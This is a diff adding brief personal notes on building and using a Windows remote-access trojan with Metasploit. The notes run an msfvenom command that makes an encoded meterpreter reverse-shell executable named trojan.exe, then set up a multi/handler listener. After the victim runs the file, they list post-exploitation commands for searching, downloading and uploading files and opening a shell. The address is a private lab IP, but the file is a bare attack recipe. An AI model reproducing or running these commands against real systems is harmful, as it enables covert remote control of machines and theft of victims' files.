@@ -1,0 +1,44 @@
+kali linux
+
+service postgresql start
+
+msfconsole
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= 10.0.2.15 LPORT=5555 -f exe -e x86/shikata_ga_nai -i 10 > trojan.exe
+
+*** copy exe file to windows
+
+kali linux 
+
+use multi/handler
+
+set playload windows/meterpreter/reverse_tcp
+
+set LHOST 10.0.2.15 
+
+set LPORT 5555
+
+exploit
+
+*** dual click on exe file in windows
+
+
+kali linux
+
+sysinfo
+
+ls
+
+ipconfig
+
+search -f *.doc
+
+search -f *.txt
+
+download (path of file) - change all "\" to "/" eg : C://user/gibson/Desktop
+
+upload filename  path
+
+shell
+
+
